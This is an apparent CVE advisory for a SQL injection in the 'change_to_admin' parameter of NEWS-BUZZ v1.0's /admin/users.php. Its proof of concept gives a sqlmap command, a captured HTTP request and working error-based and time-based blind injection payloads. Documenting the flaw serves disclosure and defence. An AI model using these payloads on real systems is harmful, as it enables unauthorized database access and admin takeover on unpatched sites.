# CVE-2025-5632

SQLi vulnerability in code-projects NEWS-BUZZ (News Management System) v1.0 of file /admin/users.php with param 'change_to_admin'

**vender**:

- code-projects

**SoftLink**:

- NEWS-BUZZ (News Management System)

**Vulnerable File**

- /admin/users.php

**Version**

- V1.0

### POC

```bash
sqlmap -r request.txt -p change_to_admin --technique ET --batch
```



```http
GET /NEWS-BUZZ/admin/users.php?change_to_admin=36 HTTP/1.1
Host: 192.168.129.1
Cookie: PHPSESSID=v43kk28qqva4ntobshvd2bhfm7; G55gnuboard5PHPSESSID=v97a0a8ojt7ipg2kkh6ts3ut73; 2a0d2363701f23f8a75028924a3af643=MTkyLjE2OC4xMjkuMQ%3D%3D; 2e61f26e7a4e8194d3d5d054536403e0=OTRjZmM1MGZiYmJkMTk4ZWFhMTRmY2Q5NWY5NWZiMmE%3D
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Referer: http://192.168.129.1/NEWS-BUZZ/admin/users.php?change_to_admin=36
Upgrade-Insecure-Requests: 1
Priority: u=0, i
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
```



```
---
Parameter: change_to_admin (GET)
    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: change_to_admin=36' AND GTID_SUBSET(CONCAT(0x7178767671,(SELECT (ELT(9094=9094,1))),0x716a627071),9094)-- TNyq

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: change_to_admin=36' AND (SELECT 9615 FROM (SELECT(SLEEP(5)))WfoT)-- OZkx
---
```



![image-20250531011415405](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505310114474.png)